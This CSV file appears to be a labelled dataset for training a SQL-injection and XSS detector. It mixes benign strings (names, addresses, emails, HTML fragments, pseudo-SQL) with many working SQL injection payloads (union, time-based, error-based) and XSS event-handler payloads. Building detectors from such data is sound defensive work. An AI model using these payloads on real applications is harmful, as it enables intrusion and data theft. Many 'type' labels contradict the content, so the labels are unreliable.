Text,Label,type
"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",2,xss
<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>,2,xss
UEv,1,xss
"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",1,sql
angold@callofduty6.nu,0,sql
"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
de78e24423n6e,0,sql
2308,0,sql
" SELECT column_name ( s )  FROM wherever,everyone",0,sql
massimo,0,sql
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",2,xss
"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",1,sql
braddell@cincocolores.cat,0,sql
"de l' aliga 3,",0,sql
despernada,0,xss
SELECT went ( s FROM hidden RIGHT JOIN,0,sql
74132716j,0,sql
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",1,xss
"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",0,xss
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,sql
<basefont onpointerover=alert(1)>XSS</basefont>,2,xss
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
1' or sleep  (  5  )  #,1,sql
"1   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
steinfeld@multireform.sg,0,xss
1  )   and 9198  =  9198--,1,sql
derwin,0,sql
alins,0,sql
FROM  ( SELECT DISTINCT bend FROM village ) ,0,sql
"<fieldset draggable=""true"" ondrag=""alert(1)"">test</fieldset>",2,xss
"<li><a href=""/wiki/Interactionism_(philosophy_of_mind)"" title=""Interactionism (philosophy of mind)"">Interactionism </a> </li>",0,xss
altamiranda aragons,0,sql
hi'  )   or   (  'a'  =  'a,1,sql
"1'  )   where 4750  =  4750 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",2,xss
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,1,sql
SELECT clearly ( s )  FROM massage SELECT double ( s ) ,0,xss
45591,0,sql
SELECT lot ( s )  FROM escape,0,sql
gomska.hopper@ebuy.com.bi,0,sql
"    <section data-toggle=""wy-nav-shift"" class=""wy-nav-content-wrap"">",0,xss
"<input onpaste=alert(1) value="""" autofocus>",2,xss
taghizad,0,sql
SELECT TOP 50 PERCENT * FROM leader,0,sql
"<style>@keyframes slidein {}</style><article style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></article>",2,xss
estrad sivelli,0,sql
	 </h3>,0,xss
	 </span> </li>,0,xss
SELECT * FROM farm WHERE split NOT BETWEEN 'settlers' AND 'flat',0,sql
SELECT * FROM protection FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM higher,0,sql
"<a href=""/wiki/Bayesian_network"" title=""Bayesian network"">Bayesian networks </a>:",0,xss
"<li id=""cite_note-277""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-277"">^ </a> </b> ",0,xss
"<rtc onmouseleave=""alert(1)"">test</rtc>",2,xss
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,1,sql
"<caption oncontextmenu=""alert(1)"">test</caption>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",2,xss
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0,sql
"INSERT INTO locate ( nose, fellow, heard, dance, angle, recall )  VALUES  ( 'period', 'laugh'. collect', 'world', 'including', 'under', 'traffic' )  ",0,sql
SELECT * FROM alive,0,xss
c/ cardenal benilloch 171 12?h,0,sql
26241,0,sql
"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",1,sql
"1%""  )   union all select null,null,null,null#",1,sql
wei-tsig8,0,sql
SELECT DISTINCT middle FROM medicine,0,xss
"   SELECT cent, cool, bareFROM anybody WHERE drop  IS NOT NULL",0,sql
SELECT conversation ( s )  FROM sit SELECT involved ( s ) ,0,sql
"<embed ondblclick=""alert(1)"">test</embed>",2,xss
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
"INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  ",0,xss
SELECT COUNT ( battleID ) FROM church,0,sql
SELECT COUNT ( DISTINCT breathe )  FROM turn,0,xss
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'beoh'  =  'beoh",1,sql
-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,1,sql
"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",1,sql
SELECT without,0,sql
SELECT * FROM  ( SELECT porch FROM studied ) ,0,xss
"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""iuzv"" like ""iuzv",1,xss
"	 </span> <span class=""reference-text"">",0,xss
" SELECT * FROM certain ORDER BY judge, dinner",0,sql
"<aside onmouseenter=""alert(1)"">test</aside>",2,xss
16646,0,xss
<dd id=x tabindex=1 onactivate=alert(1)></dd>,2,xss
"<multicol onkeydown=""alert(1)"" contenteditable>test</multicol>",2,xss
"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",1,sql
mortandad,0,sql
"-6940'  )   union all select 3042,3042,3042,3042,3042#",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7074 )  ORDER BY meta_id ASC",0,sql
"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=61"" title=""Edit section: Consciousness"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT * FROM thrown WHERE advice BETWEEN 'chest' AND 'uncle',0,sql
SELECT jet ( s )  FROM nervous UNION ALL,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 70699 )  ORDER BY meta_id ASC",0,sql
	 </span>,0,xss
invo3unta6i5,0,sql
1' where 4403  =  4403 rlike sleep  (  5  )  #,1,xss
SELECT importance ( s ) FROM earth INNER JOIN,0,sql
5366,0,xss
SELECT * FROM build ORDER BY plenty DESC,0,sql
<address onpointerover=alert(1)>XSS</address>,2,xss
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0,sql
femke,0,sql
"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nav>",2,xss
select   (  case when   (  2350  =  8682  )   then 2350 else 1/  (  select 0  )   end  )  --,1,sql
SELECT its FROM deal,0,sql
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,1,sql
" SELECT column_name ( s )  FROM individual,moon",0,sql
SELECT * FROM softly WHERE correctly LIKE '%luck%',0,sql
"INSERT INTO him ( kitchen, waste, triangle, half, pool, shore )  VALUES  ( 'managed', 'name'. living', 'library', 'cell', 'told', 'stems' )  ",0,sql
SELECT COUNT ( leather ) FROM play,0,sql
"1%""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1,sql
"<li><a href=""/wiki/Human-based_evolutionary_computation"" title=""Human-based evolutionary computation"">Human-based evolutionary computation </a> </li>",0,xss
 ,0,xss
fina,0,sql
"1 where 1656  =  1656 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM case ORDER BY somebody DESC,0,sql
afasia,0,sql
SELECT * FROM tobacco WHERE cookies = 'measure'  AND City = 'butter',0,sql
nandor,0,xss
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",2,xss
SELECT AVG ( shop ) FROM yes SELECT SUM ( front ) ,0,sql
ajuagas,0,xss
SELECT * FROM spite FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM describe,0,sql
"  SELECT TIME ( ""2017-08-15 19:30:10.000001"" ) ;",0,xss
"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",1,sql
"-5903%""   )    )     )   or 3038  =  3038",1,sql
"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",1,xss
SELECT AVG ( printed ) FROM single,0,sql
"<canvas draggable=""true"" ondragstart=""alert(1)"">test</canvas>",2,xss
venancia,0,sql
SELECT DISTINCT roof FROM trail,0,sql
schaafsma@gay-tantra.sj,0,sql
SELECT * FROM torn WHERE feathers = 'count'  OR today = 'rule',0,sql
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",1,sql
 </p>,0,xss
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_6,_Chapter_7-73""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_6,_Chapter_7_73-0"">^ </a> </b> ",0,xss
SELECT * FROM can,0,sql
"<li><a href=""/wiki/Gordon_Pask"" title=""Gordon Pask"">Gordon Pask </a> </li>",0,xss
end and 'blit'  =  'blit,1,sql
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '715' )  ORDER BY tr.object_id ASC,0,xss
"<figcaption onmousemove=""alert(1)"">test</figcaption>",2,xss
SELECT COUNT ( darknessID ) FROM nodded,0,xss
SELECT * FROM system WHERE she = 'meet' LIMIT 3,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/broad-crawls.html"">Broad Crawls</a></li>",0,xss
cabal urrupan,0,xss
	 </span>,0,xss
"  SELECT happily AS prove, rule AS [cat]  FROM straw",0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Borowiec, Tracey Lien, Steven (2016). <a rel=""nofollow"" class=""external text"" href=""https://www.latimes.com/world/asia/la-fg-korea-alphago-20160312-story.html"">""AlphaGo beats human Go champ in milestone for artificial intelligence"" </a>. <i>latimes.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
!,1,sql
"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,1,sql
"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""egxe""  =  ""egxe",1,sql
"	 </span>. Harvard University Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-674-57616-2"" title=""Special:BookSources/978-0-674-57616-2""><bdi>978-0-674-57616-2 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind+Children&amp;rft.pub=Harvard+University+Press&amp;rft.date=1988&amp;rft.isbn=978-0-674-57616-2&amp;rft.aulast=Moravec&amp;rft.aufirst=Hans&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindchildrenfutu00mora&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Authority_control"" title=""Authority control"">Authority control </a> </li>",0,xss
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,sql
"  SELECT Orders.ninerID, Employees.teach, Employees.canal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.straightID ORDER BY Orders.compoundID",0,xss
SELECT * FROM fighting  WHERE heart = chicken,0,xss
1  )   where 2307  =  2307,1,sql
"<li><a href=""/wiki/Gene_expression_programming"" title=""Gene expression programming"">Gene expression programming </a> </li>",0,xss
"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",2,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">Artificial general intelligence </a> and <a href=""/wiki/AI-complete"" title=""AI-complete"">AI-complete </a> </div>",0,xss
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1,sql
carew1@koinup.ni,0,sql
SELECT * FROM hill WHERE mother = 'firm'  AND City = 'ate',0,sql
"1'  )   where 2802  =  2802 union all select null,null,null#",1,sql
end and   (  'uxzv'  =  'uxzv,1,sql
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0,sql
"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,sql
42127,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Sample, Ian (18 October 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/science/2017/oct/18/its-able-to-create-knowledge-itself-google-unveils-ai-learns-all-on-its-own"">""<span class=""cs1-kern-left"">' ",0,xss
destriana,0,sql
SELECT carried ( s )  FROM map LEFT JOIN,0,sql
SELECT * FROM condition WHERE basis BETWEEN '1996-07-01' AND '1996-07-31',0,xss
"-7125"" or   (  8919  =  2275  )  *2275 and ""fbwo""  =  ""fbwo",1,sql
1'  )   where 5286  =  5286,1,xss
"   SELECT simple, let+ ', ' + occasionally+ ' ' + break+ ', ' + shelf AS customs  FROM ship",0,sql
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1,sql
"<ul><li><a href=""/wiki/Network_architecture"" title=""Network architecture"">Network architecture </a> </li>",0,xss
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,2,xss
7361,0,sql
poma gozalbo,0,sql
SELECT * FROM name 3 SELECT * FROM pocket,0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_network"" title=""Computer network"">Networks </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT roll FROM exclaimed UNION ALL SELECT rabbit FROM struggle ORDER BY office,0,xss
lazure,0,xss
"-8301'  )   union all select 1806,1806--",1,sql
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.1 </li>",0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""weku"" like ""weku",1,sql
"	 </span> <span class=""reference-text"">R. J. Williams and D. Zipser. Gradient-based learning algorithms for recurrent networks and their computational complexity. In Back-propagation: Theory, Architectures and Applications. Hillsdale, NJ: Erlbaum, 1994. ",0,xss
"masia ca l'angel 39,",0,sql
SELECT * FROM society WHERE partly = 'pocket',0,sql
"<sup id=""cite_ref-154"" class=""reference""><a href=""#cite_note-154"">&#91;151&#93; </a> </sup>",0,xss
"        <script src=""_static/jquery.js""></script>",0,xss
"<ul><li><a href=""#CITEREFClark2015"">Clark 2015 </a> </li> </ul>",0,xss
hillerman.gallo@muebetuweb.ki,0,sql
"<li><a href=""#CITEREFNilsson1983"">Nilsson 1983 </a>, pp.&#160;10–11 </li> </ul>",0,xss
"1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1,sql
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""bizm""  =  ""bizm",1,sql
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'leps' like 'leps",1,sql
"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT compare ( s )  FROM must SELECT drive ( s ) ,0,xss
"   SELECT battle, pass+ ', ' + include+ ' ' + information+ ', ' + slowly AS this  FROM live",0,sql
<ruby onpointerup=alert(1)>XSS</ruby>,2,xss
sangres,0,sql
"document.getElementsByName("""")",2,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",1,xss
e_ncobador,0,sql
"   SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL",0,sql
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1,sql
"  SELECT Orders.expectrID, Employees.about, Employees.zipper FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.determineID ORDER BY Orders.unitID",0,sql
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1,sql
"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1,xss
SELECT wash ( s )  FROM aloud UNION ALL,0,sql
25270,0,sql
SELECT COUNT ( bill ) FROM national,0,sql
begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,1,sql
<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>,2,xss
SELECT COUNT ( DISTINCT energy )  FROM second,0,sql
26580,0,xss
DELETE FROM stomach WHERE memory = 'later',0,sql
"	 </span>. <i>Journal of Informetrics </i>. <b>5 </b> (4): 629–649. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.joi.2011.06.002"">10.1016/j.joi.2011.06.002 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Informetrics&amp;rft.atitle=Comparing+the+expert+survey+and+citation+impact+journal+ranking+methods%3A+Example+from+the+field+of+Artificial+Intelligence&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=629-649&amp;rft.date=2011&amp;rft_id=info%3Adoi%2F10.1016%2Fj.joi.2011.06.002&amp;rft.aulast=Serenko&amp;rft.aufirst=Alexander&amp;rft.au=Michael+Dohan&amp;rft_id=http%3A%2F%2Fwww.aserenko.com%2Fpapers%2FJOI_AI_Journal_Ranking_Serenko.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
ferrandez cabaas,0,sql
"<hr oncopy=""alert(1)"" contenteditable>test</hr>",2,xss
<u onpointermove=alert(1)>XSS</u>,2,xss
1'||  (  select 'dfmw' from dual where 1723  =  1723,1,sql
"<nextid onbeforecopy=""alert(1)"" contenteditable>test</nextid>",2,xss
SELECT bark ( s )  FROM as SELECT space FROM bend,0,sql
waitfor delay '0:0:5'#,1,sql
admin' or 1  =  1#,1,sql
"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1,sql
"1'+  (  select 'arqt' where 2336  =  2336 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/overview.html"">Scrapy at a glance</a></li>",0,xss
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationend=""alert(1)""></li>",2,xss
xi629d02,0,sql
"<li><a href=""/wiki/Glossary_of_physics"" title=""Glossary of physics"">Physics </a> </li>",0,xss
"  SELECT * FROM trace WHERE slave NOT IN  ( 'light', 'tax', 'bite' )  ",0,xss
domeable,0,sql
"<li><a href=""/wiki/Concept"" title=""Concept"">Concept </a> </li>",0,xss
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1,sql
SELECT * FROM anywhere WHERE am = 'everything'  OR bigger = 'dropped',0,sql
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",2,xss
"  SELECT * FROM follow WHERE elephant IN  ( 'solve', 'four', 'throat' )  ",0,sql
"		<div class=""body"">",0,xss
-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',1,sql
san vicente del raspeig/sant vicent del raspeig,0,xss
wooland@indagacion.td,0,sql
"1""  )   as axua where 6718  =  6718",1,sql
"<canvas onmouseleave=""alert(1)"">test</canvas>",2,xss
10459,0,sql
cigales,0,sql
SELECT * FROM newspaper FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<style onmouseenter=""alert(1)"">test</style>",2,xss
SELECT * FROM  ( SELECT start FROM production ) ,0,sql
"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",1,sql
"<dd>Many of the things people know take the form of ""working assumptions"". For example, if a bird comes up in conversation, people typically picture an animal that is fist-sized, sings, and flies. None of these things are true about all birds. <a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> identified this problem in 1969<sup id=""cite_ref-Qualification_problem_104-0"" class=""reference""><a href=""#cite_note-Qualification_problem-104"">&#91;101&#93; </a> </sup> as the qualification problem: for any commonsense rule that AI researchers care to represent, there tend to be a huge number of exceptions. Almost nothing is simply true or false in the way that abstract logic requires. AI research has explored a number of solutions to this problem.<sup id=""cite_ref-Default_reasoning_and_non-monotonic_logic_105-0"" class=""reference""><a href=""#cite_note-Default_reasoning_and_non-monotonic_logic-105"">&#91;102&#93; </a> </sup> </dd>",0,xss
"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",2,xss
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",2,xss
"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
2esco63enti2,0,sql
SELECT bound ( s FROM year RIGHT JOIN,0,xss
1.53418E+15,0,sql
"-7815' union all select 2638,2638,2638,2638,2638--",1,sql
DELETE FROM eight,0,sql
"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"<strong onmouseenter=""alert(1)"">test</strong>",2,xss
66750565b,0,sql
	 </span> </a> </li>,0,xss
sorbello8@carrillo-de-albornoz.jobs,0,sql
<sup onpointermove=alert(1)>XSS</sup>,2,xss
//,1,sql
1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"<meta onmouseenter=""alert(1)"">test</meta>",2,xss
 or 1/*,1,sql
if  (  5127  =  2829  )   select 5127 else drop function okos--,1,sql
"<h4><span class=""mw-headline"" id=""Social_justice"">Social justice ",0,xss
"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,1,xss
<template id=x tabindex=1 onactivate=alert(1)></template>,2,xss
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,xss
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",1,sql
SELECT COUNT ( naturally ) FROM camera,0,sql
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""ytju"" like ""ytju",1,sql
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"1"" where 5977  =  5977",1,xss
"1""  )   where 2278  =  2278",1,sql
1'+  (  select 'gtqr' where 5660  =  5660,1,sql
SELECT AVG ( Price ) FROM western,0,xss
donhierro,0,sql
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",1,sql
hole@chicashumedas.at,0,sql
"<li><a href=""/wiki/Glossary_of_ecology"" title=""Glossary of ecology"">Ecology </a> </li>",0,xss
"  SELECT coffee AS sun, coast AS [already]  FROM ruler",0,sql
us,0,sql
1'   )    )     )   and 2006  =  2006,1,sql
-2761 or 1144  =  7657-- mfml,1,sql
"-1332  )   as qtbb where 7261  =  7261 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
